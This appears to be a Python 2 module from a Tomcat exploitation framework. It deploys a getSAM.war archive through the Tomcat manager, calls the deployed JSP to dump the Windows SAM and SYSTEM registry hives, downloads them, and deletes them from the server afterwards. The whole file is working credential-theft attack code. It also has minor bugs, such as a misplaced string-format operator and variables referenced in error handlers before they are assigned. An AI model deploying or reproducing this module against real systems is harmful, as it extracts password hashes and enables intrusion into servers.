from src.platform.tomcat.interfaces import TINTERFACES
from log import LOG
from auxiliary import Auxiliary
from os import getuid
from time import sleep
import deployer
import utility


class Auxiliary:

    def download_file(self, url, fname):
        local_filename = fname
        try:
            r = utility.requests_get(url, stream=True)
            utility.Msg("Attempting to retrieve %s as " + fname % r, LOG.DEBUG)
            with open(local_filename, 'wb') as f:
                for chunk in r.iter_content(chunk_size=1024):
                    if chunk:
                        f.write(chunk)
                        f.flush()
            return local_filename
        except Exception, e:
            utility.Msg("Reponse code:" + r.code, LOG.DEBUG)
            #utility.Msg(response.text, LOG.DEBUG)
            utility.Msg("Error downloading the " + fname + " file: %s" % e, LOG.ERROR)

    def Cleanup(self, fingerengine, fingerprint):
        url = "http://{0}:{1}/getSAM/getSAM.jsp?del".format(
            fingerengine.options.ip, fingerprint.port)

        try:
            utility.Msg("Calling delete:\n" + url, LOG.DEBUG)
            response = utility.requests_get(url)
        except Exception, e:
            utility.Msg("Reponse code:" + response.code, LOG.DEBUG)
            #utility.Msg(response.text, LOG.DEBUG)
            utility.Msg("Failed to connect: %s" % e, LOG.ERROR)
            return

        if response.status_code == 200:
            utility.Msg("Files cleaned up from server.", LOG.SUCCESS)
        else:
            utility.Msg("Reponse code:" + response.code, LOG.DEBUG)
            #utility.Msg(response.text, LOG.DEBUG)
            utility.Msg("We might not have cleaned the files up correctly", LOG.ERROR)

    def __init__(self):
        self.name = 'Obtain Sam and System Registries'
        self.versions = ['3.0','3.2','4.0','4.2','5.0','5.1','6.0','6.1']
        self.show = True
        self.flag = 'tc-sam'

    def check(self, fingerprint):
        if fingerprint.title in [TINTERFACES.MAN]:
            return True

        return False

    def run(self, fingerengine, fingerprint):
        if getuid() > 0:
            utility.Msg("Root privs required for this module.", LOG.ERROR)
            return

        utility.Msg("Using ./src/lib/getSAM.war", LOG.DEBUG)
        fingerengine.options.deploy = "./src/lib/getSAM.war"
        deployer.run(fingerengine)
        sleep(5)

        url = "http://{0}:{1}/getSAM/getSAM.jsp".format(
            fingerengine.options.ip, fingerprint.port)

        utility.Msg("Checking if successfully deployed and executed.", LOG.DEBUG)

        try:
            response = utility.requests_get(url)
        except Exception, e:
            utility.Msg(response.code, LOG.DEBUG)
            utility.Msg("Failed to connect: %s" % e, LOG.ERROR)
            return

        if response.status_code == 200:
            utility.Msg("Deploy worked. Getting the files...", LOG.DEBUG)
            filenames = response.text
            if len(filenames) != 0:
                samfile = filenames.split("<")[0]
                samfile = samfile.translate(None, ' \n')
                samfile = samfile.rstrip()
                systemf = filenames.split(">")[1]
                systemf.translate(None,' \n')
                systemf = systemf.rstrip()

                utility.Msg("Data in response. SAM:" + samfile + " and System:" + systemf, LOG.DEBUG)

                urlsam = "http://{0}:{1}/getSAM/{2}".format(
                                        fingerengine.options.ip, fingerprint.port, samfile)
                self.download_file(urlsam, "SAM")

                urlsys = "http://{0}:{1}/getSAM/{2}".format(
                                        fingerengine.options.ip, fingerprint.port, systemf)
                self.download_file(urlsys, "System")
                utility.Msg("Downloaded System/SAM to local directory.", LOG.SUCCESS)

                self.Cleanup(fingerengine, fingerprint)

        else:
            utility.Msg("Reponse code:" + response.code, LOG.DEBUG)
            #utility.Msg("Response data:\n" + response.text, LOG.DEBUG)
            utility.Msg("Seems the module didn't deploy correctly...", LOG.ERROR)

        fingerengine.options.deploy = None